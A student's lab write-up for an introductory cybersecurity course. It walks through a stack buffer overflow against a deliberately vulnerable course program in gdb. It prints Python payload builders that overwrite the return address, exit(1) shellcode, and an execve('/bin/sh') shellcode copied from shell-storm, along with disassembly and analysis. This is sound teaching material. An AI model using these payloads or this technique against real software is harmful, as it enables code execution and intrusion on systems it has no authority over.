---
date_created: 2024-02-16
date_modified: 2024-02-16
type: machine problem notes
course number: CMSC 134
course title: Cyber Security Introduction
entry number: "1"
---

# Machine Problem 1
In this post, I’ll be describing how I managed to exit the program with code 01 right after changing the `vuln()` function’s return address using a stack smashing technique.

## TL;DR
- `eip` upon entering `vuln()` is `0x56556183`
- we break at `0x56556191` (`ret` from `vuln`) to observe behavior of `eip`
- following the suggested information-giving commands in `gdb`, we get the desirable `esp` in vuln being `0xffffcde8`
	- we confirm this by defining `hook-stop` with `x/1i $eip` and `x/16wx $esp` which allows us to view the current instruction and the next 16 words in the stack every time execution is stopped
- we try to craft the shell code
- compiling the given `asm` with necessary incantations fails
- we look for an exit one shell code in shell-storm
- we find that it has the exact same codes in as the ones already in the `mp1.pdf`
- we finally craft shell code
	- `\x41 * 12` for padding
	- `\xe8\xcd\xff\xff` redirecting our `eip`
	- `\x31\xc0\x40\x89\xc3\xcd\x80` exit one shell code
- we analyze exactly what the machine code does because we’re not script kiddies
- we try running `/bin/bash` with an `execve("/bin/bash")` shell code (ofc from shell-storm)
- \$\$\$ profit
## Know thy enemy
After compiling `vuln.c` with the necessary incantations, load its symbols into `gdb` with `gdb -q vuln`, and following through with the preliminary magicks required to peer into the heart of the code, most especially with `info frame`, we figure out that our `eip` has been yeeted into `0x56556183`, the current `esp` is at `0xffffcdf8`, and the current `ebp` is at `0xffffcdf0`. We also know from `print &buffer` that it is stored at the location `0xffffcde8`, showing that the stack has allocated 8 bytes for `char buffer`. This will be important in our stack smashing endeavor.

![[Pasted image 20240217052610.png]]

Lets take a deeper look at the `vuln()` by disassembling it with `disassemble vuln` in `gdb`:
![[Pasted image 20240217052736.png]]
I assume that the arrow points towards where we set `break 1`, which is at the declaration of `char buffer[8]`.  

We want to change where our function returns, so lets take a look at what stored in `0x56556191` by setting a break point at that address (`break *0x56556191`). To gain more insight however, we need to look at our beginner’s book of spell analysis, famously called “[*The Documentation*](https://ftp.gnu.org/old-gnu/Manuals/gdb/html_chapter/gdb_toc.html)”.

We have gleaned information from our guide that `x/1i $eip` allows us to print out the value of `eip` (what will be executed next), and lets also take a look at our stack with `x/16wx`, allowing us to see the next 18 words from where we currently are in the stack.

A quick look at our guide tells us that we can automate this with a `hook`, which can be executed at certain points when running the program. `hook-stop` is particularly of interest, since it automatically executes whenever our program stops running in `gdb`, like hitting breakpoints. So here is what we’ve done so far:

```
(gdb) b *0x56556191
(gdb) define hook-stop
>x/1i $eip
>x/16wx $esp
end
```

Now we run the program again from the beginning, prompting us with the `gets()` function and for now we enter `ASD`. Our program stops at the return address, promptly showing the value of `eip` and the next 16 words in our stack. 

![[Pasted image 20240217054933.png]]

Going a single step with `si` shows us a jump from `0x56556191`  to `0x5655619a`, which is our `while(1){}` loop: 
![[Pasted image 20240217061443.png]]

While it doesn’t seem useful now, it is once we have crafted our payload. Speaking of which, lets do just that:

## My Kung Fu is stronger than yours
> Your security technique will be defeated! - Zeke Shif, December 25 1994

Lets sum up what we know:
- `buffer`’s last byte is at `0xffffcde8`
- `vuln()`’s stack frame base pointer (`ebp`) is at `0xffffcdf0`
- the `esp` for the current frame `0xffffcdf8`

The plan is to overflow `buffer`, write whatever into `sfp` and change `rip` to `esp`, so we `eip` pops that value and continues execution from there. Lets test that hypothesis  by creating our machine code payload. I really don’t wanna recite the *ancient rites of assembly incantations*, so lets just use our *Parseltongue* and summon the will of the snake (`python 3.11`):

``` python
import struct

# we want to write past the sfp and change rip
padding = b"A" * 12
ret_address = 0xffffcdf8
redirect = struct.pack("<I", ret_address)

payload = padding + redirect

with open("payload", "wb") as f:
	f.write(payload)
```

And voila, we have written machine code payload into a file called `payload`. How very developer-like to name things the same thing. Anyway, `struct.pack` gives us a `bytes` type object in a certain format – which is `"<I"` which is a little-endian byte order.

Does that actually work? Lets find out (Haha did you get it? No? Okay, it was a stupid reference anyway):

Lets load the `payload` into `vuln` with the command `r < payload` and run the whole thing from the beginning. In theory, it should ***penetrate*** our stack so **deep** it **fills up** the `rip` with *something* (`0xffffcdf8`):

![[Pasted image 20240217080558.png]]

This is our `ret` breakpoint, lets go one step from here with `si`:
![[Pasted image 20240217080657.png]]

We did manage to ***penetrate and fill up*** our `rip` and control execution, but we’re missing one crucial thing for our payload. The shell code for `exit(1)`! Anyway, lets continue our current run first for educational purposes.
![[Pasted image 20240217080946.png]]

So it gives us a `SIGILL`, probably because its doing something sinister, i dunno (the CPU dunno too so it just gives `SIGILL`). Anyway, lets do the shell code now. I tried just copying the assembly incantation from `mp1.pdf` but it doesn’t work for me idk.
![[Pasted image 20240217082053.png]]
![[Pasted image 20240217082122.png]]

So I’ll just copy the bytes directly and see what happens:

``` python
import struct

# we want to write past the sfp and change rip
padding = b"A" * 12
ret_address = 0xffffcdf8
redirect = struct.pack("<I", ret_address)
exit_one = b"\x31\xc0\x40\x89\xc3\xcd\x80" 

payload = padding + redirect + exit_one

with open("payload", "wb") as f:
	f.write(payload)
```

Now lets regenerate payload with `python payload.py` and rerun `vuln` in `gdb`
![[Pasted image 20240217082535.png]]

And just like that, we can see the shell code being executed in (little-endian) order in the stack. However, let’s not be *script kiddies* and actually analyze what it does:
```asssembly
118a: 31 c0 xor %eax,%eax ; set eax to 0
118c: 40 inc %eax         ; incremenet eax by 1
118d: 89 c3 mov %eax,%ebx ; move eax into ebx (now ebx = 1)
118f: cd 80 int $0x80     ; trigger interrupt, invoke syscall (eax)
```

Okay, I know I put comments, but just to make it clearer:
- `\x31\xc0`: XORs the `eax` register with itself, effectively setting `eax` to 0.
- `\x40`: Increments `eax` by 1, so `eax` becomes 1.
- `\x89\xc3` passes exit code (`ebx=1`) to the `exit` syscall 
- `\xcd\x80`: Triggers an interrupt `0x80`, which is the Linux syscall interrupt. The value in `eax` determines which syscall to invoke. In this case, `eax` is set to 1 (the `exit` syscall number), so it invokes the `exit` syscall.

## Why stop there?
I mean we’re already here, lets run bash. We can do this with the `execve` command, with the input being `"/bin/sh"`. However, I really don’t wanna reinvent the wheel and make my own shell code from with assembly, so I’m gonna stand on the [*shoulder of giants*](https://shell-storm.org/shellcode/files/shellcode-811.html) (most especially, the giant named **Jean Pascal Pereira**. Whoever you are, thanks!):

This assembly code is from the shell-storm link I carefully placed above:
```asm
31 c0                 xor    %eax,%eax          ; Clear eax register (set it to 0)
50                    push   %eax               ; Push null byte onto the stack (used as a terminator)
68 2f 2f 73 68        push   $0x68732f2f        ; Push the string "//sh" onto the stack in reverse order
68 2f 62 69 6e        push   $0x6e69622f        ; Push the string "nib/" onto the stack in reverse order
89 e3                 mov    %esp,%ebx          ; Move the address of the top of the stack (which now contains the "/bin/sh" string) into ebx
89 c1                 mov    %eax,%ecx          ; Move 0 (null) into ecx (will be used as the second argument to execve, argv)
89 c2                 mov    %eax,%edx          ; Move 0 (null) into edx (will be used as the third argument to execve, envp)
b0 0b                 mov    $0xb,%al           ; Move the syscall number for execve (11) into al
cd 80                 int    $0x80              ; Invoke the syscall (execve("/bin/sh", 0, 0))
31 c0                 xor    %eax,%eax          ; Clear eax register (set it to 0)
40                    inc    %eax               ; Increment eax (set it to 1, which is the syscall exit number)
cd 80                 int    $0x80              ; Invoke the syscall (exit)
```

As usual, we analyze the assembly code to **not become script kiddies**. Now its just a matter of inserting the machine code in our python script, (we’re keeping the `exit_one` code though):

``` python
import struct

# we want to write past the sfp and change rip
padding = b"A" * 12
ret_address = 0xffffcdf8
redirect = struct.pack("<I", ret_address)
exit_one = b"\x31\xc0\x40\x89\xc3\xcd\x80" 
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = padding + redirect + shellcode

with open("payload", "wb") as f:
	f.write(payload)
```

Now lets rerun the entire thing:
![[Pasted image 20240217085444.png]]

,As we can see, we successfully executed a new program, `/usr/bin/bash`. A slight problem is that I cannot really execute this outside of gdb - it is due to Linux ASLR and probably memory padding, but that’s most likely outside the scope of this machine problem.


## Know thy enemy
Am I really correct about my assumptions? Or am i writing past the vuln stack frame, redirecting into `main`’s `esp` and executing from there?
![[Pasted image 20240223073220.png]]
![[Pasted image 20240223073237.png]]

first, we define `hook-stop` to allow us to view the next 1 instruction on the `eip`, and 16 words starting from the `esp` register.

```bash
define hook-stop
>x/1i $eip
>x/16wx $esp
>end
```

we can see will be allocating its own stack frame in the next instruction, by moving `ebp` to `esp`
![[Pasted image 20240223080037.png]]
we can confirm this by getting information on the stack frame with `info frame`
![[Pasted image 20240223080323.png]]

as we saw in `dissassemble main` above, the next instruction is to `call <vuln>`. lets single step and and view our registers to confirm that main’s stack frame is indeed in `0xffffcdf8`

![[Pasted image 20240223080648.png]]

as we can see, both `esp` and `ebp` at this point are at `0xffffcdf8` because main isn’t allocating any variables. The next instructions are to `call <vuln>` and allocate stack frame for `vuln`. lets move to `vuln <+1>` and look at the stack.
![[Pasted image 20240223074453.png]]
Lets analyze it a bit:
1 - `0x56556195 <main+3>:	call   0x5655617d <vuln>`
- stores return address in 1, which is at the address `0xffffcdf5->0xffffcdf8`
2 - `0x5655617d <vuln>:	push   %ebp`
- pushes the previous `ebp`
- the next 5 instructions (`x/5i $eip`) shows us:
	- move ebp into current esp (creating a new stack frame for `vuln()`)
	- decrement esp by 8 bytes
	- allocate address for `buffer[8]
	- push `buffer[8]` address into stack
	- call `gets()` function

we can confirm this is exactly what its doing by checking registers now:
![[Pasted image 20240223075111.png]]

then move exactly one instruction then check registers again
![[Pasted image 20240223075248.png]]

let’s single step ahead while keeping tabs on the stack. 
![[Pasted image 20240223081128.png]]

Since our `hook-stop` was defined to view 16 words from the esp, we can see that the instruction `<vuln+6>:	lea    -0x8(%ebp),%eax` did allocate 8 bytes for `buffer[8]`. To further confirm this, lets print the location of `buffer` now with `print &buffer`:
![[Pasted image 20240223081247.png]]

Indeeed our buffer was allocated 8 bytes from `0xffffcde8` → `0xffffcdef`
![[Pasted image 20240223081457.png]]
In case it wasn’t obvious, our view of the stack printing from the `$esp` register gives us an inverted view of the stack, where the memory addresses increase as we go down. we can see that at address `0xffffcdf0` → `0xffffcdf4` that the address `0xffffcdf8` is stored, which should be our `sfp (old ebp)`, and right next to it is the `rip (old eip)`, storing where the `eip` should continue execution. Looking at our `disas main`, that is the instruction right after `call vuln`

![[Pasted image 20240223081907.png]]

## What do we do now?
First, lets grab our shell code:
### Ghost in the (egg) Shell
The provided asm doesnt really compile on my end, even with the provided incantation 
![[Pasted image 20240217082053.png]]
![[Pasted image 20240217082122.png]]

So let’s do what any decent “*hacker*” would  do and look for it online. The glory days of insecure software have been long gone, so surely there is a myriad of old, low-level exploits online. The site that struck out to me immediately after searching for the keyword `shell codes` in google is: 

![[Pasted image 20240223082721.png]]

Of course, because I’m lazy:
![[Pasted image 20240223082821.png|379]]
```c
/* exit-core.c by Charles Stevenson < core@bokeoa.com >  
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I use it when I need a process to exit cleanly.
 */
char hellcode[] = /*  _exit(1); linux/x86 by core */
// 7 bytes _exit(1) ... 'cause we're nice >:) by core
"\x31\xc0"              // xor  %eax,%eax
"\x40"                  // inc  %eax
"\x89\xc3"              // mov  %eax,%ebx
"\xcd\x80"              // int  $0x80
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte _exit(1); linux/x86 by core\n",
         strlen(hellcode));
  shell();
  return 0;
}
```

And what do you know, the `mp1.pdf` actually already provided us with this holy sauce. I didn’t even need to look any further: 
```asm
117d: 55 push %ebp
117e: 89 e5 mov %esp,%ebp
1180: e8 13 00 00 00 call 1198 <__x86.get_pc_thunk.ax>
1185: 05 6f 2e 00 00 add $0x2e6f,%eax
118a: 31 c0 xor %eax,%eax
118c: 40 inc %eax
118d: 89 c3 mov %eax,%ebx
118f: cd 80 int $0x80
1191: b8 00 00 00 00 mov $0x0,%eax
1196: 5d pop %ebp
1197: c3 ret
```

We don’t really know what this does or why this works, all we know is that it should make our program exit with code 01. So let’s do some digging and analyze it a bit.

```asm
118a: 31 c0 xor %eax,%eax ; set eax to 0
118c: 40 inc %eax         ; increment eax by 1
118d: 89 c3 mov %eax,%ebx ; move eax into ebx (now ebx = 1)
118f: cd 80 int $0x80     ; trigger interrupt, invoke syscall (eax)
```

Now I can tell you that I *know* what exactly it is doing given these commands, but I can’t really explain why. I looked through the [intel developer’s manual](https://cdrdv2-public.intel.com/671110/325383-sdm-vol-2abcd.pdf) but I can’t really find an explanation as to why setting `eax = 1` results in the `syscall exit`, or why it looks at `ebx` to provide the exit code, or why `cd 80 (int $0x80)` results in an interrupt. So for now let’s just press the **i believe** button on this and press on.

### `rip` and tear
The call to `gets()` in the next instruction allows us to write into the start of buffer, `0xffffcdf8` and beyond. 
![[Pasted image 20240223085008.png]]
- we know that the <span style="color:green">green addresses</span> is the `buffer[8]`, 
- we know that the <span style="color:#3bedf3">teal addresses</span> is the `sfp (old ebp)`, 
- we know that the <span style="color:red">red addresses</span> is the `rip (main() eip)`

from here, we can proceed in two ways:
1. We can *snipe* `buffer[8]` and insert our shell code there. It fits, since the shell code is only 7 bytes long, and redirect <span style="color:red">rip</span> to the start of our <span style="color:green">buffer</span> at `0xffffcde8`. Lets call this the **snipe method**, because idk, I’m bad at naming things.

2. since we can write to higher memory addresses anyway, we can just redirect <span style="color:red">rip</span> to `0xffffcdf8` where the rest of our shell code would be located anyway
	- ![[Pasted image 20240223090103.png]]
	- Let’s call this the **matrix method**, because as I said, I’m bad at naming things. Anwyay, here’s a quick visualization of our goal:
```bash
0xffffcde8:	0xdeadbeef	0xdeadbeef	0xdeadbeef	0xffffcdf8
0xffffcdf8:	0xshelcode	0xshelcode	0xshllcode	0xffffceb4
0xffffce08:	0xffffcebc	0xffffce20	0xf7e1fe2c	0x56556192
0xffffce18:	0x00000001	0xffffceb4	0xf7e1fe2c	0xffffcebc
```


Because we can, lets do both!
#### Snipe method
Let’s outline the steps of our creating the snipe shell code:
- insert `exit 01` shell code (`\x31\xc0\x40\x89\xc3\xcd\x80`) into the `buffer`
- insert `NOP`’s (`\x90`) to pad the remaining 1 byte and also pad the `sfp`
	- we don’t really need to do anything with the `sfp`, we’re just padding it so we can get to the `rip`.
- redirect the rip to the start our buffer at `0xffffcde8`

Of course we can just write the bytes in the terminal directly to `payload`, but for the purpose of re-usability lets do it in `python`:

``` python
import struct

# we want to write past the sfp and change rip
nop = "\x90"
buf_addr = 0xffffcde8
redirect = struct.pack("<I", buf_addr)
exit_one = b"\x31\xc0\x40\x89\xc3\xcd\x80" 

payload = exit_one + (nop * 5) + redirect

with open("payload", "wb") as f:
	f.write(payload)
```

Our final `payload` should look like something like this in bytes:
`\x31\xc0\x40\x89\xc3\xcd\x80 \x90\x90\x90\x90\x90 \xe8\xcd\xff\xff`
- the python `struct.pack()` simply packs the `buf_addr` in bytes, and as you may have already guessed (or you already knew about that, idk), the `"<I"` specifies it to be in little-endian format.
- note that the spaces shouldn’t be there, I’m just adding those in to make it readable to humans.

now let’s rerun `vuln` with the payload automatically inserted when it asks for input with `r < payload`

I set a break point at the part right before the `esp` is incremented to deallocate the stack frame for `vuln`, so we can look at the stack from the esp at that point:
![[Pasted image 20240223092540.png]]

as we can see, the buffer starting at `0xffffcde8` already has the `exit(1)` shell code. It has been padded with a `nop` (`\x90`), but that will be fine since its in little-endian format. The `rip` at `0xffffcdf4` has also been redirected to  `0xffffcde8`, which will be executed (since we turned off write/execute protection in our compiler flags).

Looking at our `disas vuln`, the next instructions will be
- `0x56556190 <+19>:	leave` → move `esp` to `ebp` and pop `sfp` (which we have set to `0x90909090`) making the `ebp` store `0x90909090`. we can confirm this in the next instruction when we look at `info registers`. 
- `0x56556191 <+20>:	ret` → pop `rip` and continue execution.

![[Pasted image 20240223093558.png]]

Now that we have `ret`urned from `vuln`, since we have changed `rip` we can see that it is now executing from our buffer, `0xffffcde8`. If you can recall, we have defined `hook-stop` to show us the next instruction in `eip` and the next 16 words from `esp`. Of course, the esp is in `0xffffcdf8` since the esp was incremented a while ago, so we cant really see anything of value there. 

So let’s take a look at the stack by printing the next 16 words from the address of our buffer, `0xffffcde8`: 
![[Pasted image 20240223093937.png]]
Let’s also take a look at what the next 5 instructions are: 
![[Pasted image 20240223094017.png]]

And what do you know, our shell code worked! We’re deadset on a homerun and the only thing that’s stopping us is `ctrl + c`. Of course, we’re not stopping now. We’ll continue execution. But before that, i claimed that the `ebp` will be set to `x90909090` a while ago. Lets take a look at our registers now.
![[Pasted image 20240223094229.png]]

Hell yeah. Let’s continue execution with `c` and look at the glorious exit code.
![[Pasted image 20240223094308.png]]

and just like that, snipe method worked just fine.

#### Matrix method
To recap:

![[Pasted image 20240223090103.png]]

The plan is to: 
- pad `buffer` and `sfp` with `NOP`s, 
- redirect `rip` to `0xffffcdf8` (where the rest of our shell code will be placed, due to the nature of `gets` allowing us to write up into higher memory addresses beyond `buffer`)
- store and execute our shell code at `0xffffcdf8` and beyond

Since the buffer is 8 bytes and the `sfp` is 4 bytes, we will need 12-bytes’ worth of `NOP`s, our redirect to `0xffffcdf8` which is actually `main's` `ebp`. 

If you recall, we already discussed this above:
- `main` allocates stack frame at `0xffffcdf8`
- doesn’t really have variables, so just immediately stores values below it
- as you can see the <span style="color:#3bedf3">sfp</span> *normally* points to `0xffffcdf8`, so that confirms that `0xffffcdf8` is indeed `main`’s `ebp`.

Now, for our shell code:

``` python
import struct

# we want to write past the sfp and change rip
nop = "\x90"
# buf_addr = 0xffffcde8
redirect_addr = 0xffffcdf8
redirect = struct.pack("<I", redirect_addr)
exit_one = b"\x31\xc0\x40\x89\xc3\xcd\x80" 

payload = (nop * 12) + redirect + exit_one

with open("payload", "wb") as f:
	f.write(payload)
```

Our final `payload` should look like something like this in bytes:
`\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90 \xe8\xcd\xff\xff \x31\xc0\x40\x89\xc3\xcd\x80`

Without further ado, let’s rerun `vuln` with our payload.
![[Pasted image 20240223095739.png]]
I skipped over the initial things, I believe I don’t need to explain those anymore. As we can see here: 
- `buffer` and `sfp` are filled with `NOP`s
- <span style="color:red">rip</span> at `0xffffcdf4` points towards <span style="color:green">0xffffcdf8</span>
- <span style="color:green">0xffffcdf8</span> up until `0xffffcdff` contains our `exit(1)` shell code.

Let’s skip to `ret` and single step from here just to view it more closely:
![[Pasted image 20240223100051.png]]
And there you go, we are already executing `exit(1)`. Just to confirm, let’s view the next 5 instructions in the `eip`:
![[Pasted image 20240223100135.png]]

And that’s that. Lets continue and get our sweet sweet `exited with code 01`
![[Pasted image 20240223100209.png]]

Now that we have a reliable way to insert longer shell code, lets try `execve("/bin/bash")`

## Beyond the matrix
This is just for fun, we grab [shell code from shell-storm](https://shell-storm.org/shellcode/files/shellcode-811.html) that executes `execve("/bin/bash") 

```c
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

Before pressing the `i believe` button, let’s look at what the shell code does though. As usual, I don’t know why `\xcd\x80` calls an interrupt, it just does.

```asm
31 c0                 xor    %eax,%eax          ; Clear eax register (set it to 0)
50                    push   %eax               ; Push null byte onto the stack (used as a terminator)
68 2f 2f 73 68        push   $0x68732f2f        ; Push the string "//sh" onto the stack in reverse order
68 2f 62 69 6e        push   $0x6e69622f        ; Push the string "nib/" onto the stack in reverse order
89 e3                 mov    %esp,%ebx          ; Move the address of the top of the stack (which now contains the "/bin/sh" string) into ebx
89 c1                 mov    %eax,%ecx          ; Move 0 (null) into ecx (will be used as the second argument to execve, argv)
89 c2                 mov    %eax,%edx          ; Move 0 (null) into edx (will be used as the third argument to execve, envp)
b0 0b                 mov    $0xb,%al           ; Move the syscall number for execve (11) into al
cd 80                 int    $0x80              ; Invoke the syscall (execve("/bin/sh", 0, 0))
31 c0                 xor    %eax,%eax          ; Clear eax register (set it to 0)
40                    inc    %eax               ; Increment eax (set it to 1, which is the syscall exit number)
cd 80                 int    $0x80              ; Invoke the syscall (exit)
```

If you look closely, we’re reversing *”/bin/sh”* for the little endian format. Anyway, `execve` allows us to execute a program, or so it says in the `man-pages`:

```man
execve(2)                                       System Calls Manual                                      execve(2)

NAME
       execve - execute program

LIBRARY
       Standard C library (libc, -lc)

SYNOPSIS
       #include <unistd.h>

       int execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[]);

DESCRIPTION
       execve() executes the program referred to by pathname.  This causes the program that is currently being run
       by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initial‐
       ized and uninitialized) data segments.
```


Now lets rerun `vuln` with our shiny, brand-new payload:
![[Pasted image 20240223101327.png]]

As usual:
- <span style="color:3bedf3"> teal </span> is our `buffer` and `sfp`
-  <span style="color:red">red </span> is our `rip`
-  <span style="color:green">green </span> is our shell code , with the <span style="color:orange">orange </span>part showing the last 4 bytes, ending with the `interrupt` of course.

We continue and take a look at what is going on with the `eip`. Since we have 12 instructions in the `asm` version of the shell code, lets take a look at the next 12 instructions of our `eip`: 
![[Pasted image 20240223101558.png]]
![[Pasted image 20240223101610.png]]

That’s our `execve` shell code! Anyway, lets continue from here:
![[Pasted image 20240223101657.png]]

We can see that its executing `/usr/bin/bash`, because `/bin/bash` is just a `symlink`. Anyway, now we have what they call arbitrary code execution – sort of. I can’t really get this to run in the terminal, even when I disable Address space layout randomization (_ASLR_) for `vuln`. I suspect it might have something to do with having a different memory address as compared to running it in `gdb`, but that’s already outside the scope of this machine problem, so I believe that’s the end of this writeup.


#### それでわ、 じゃあ！
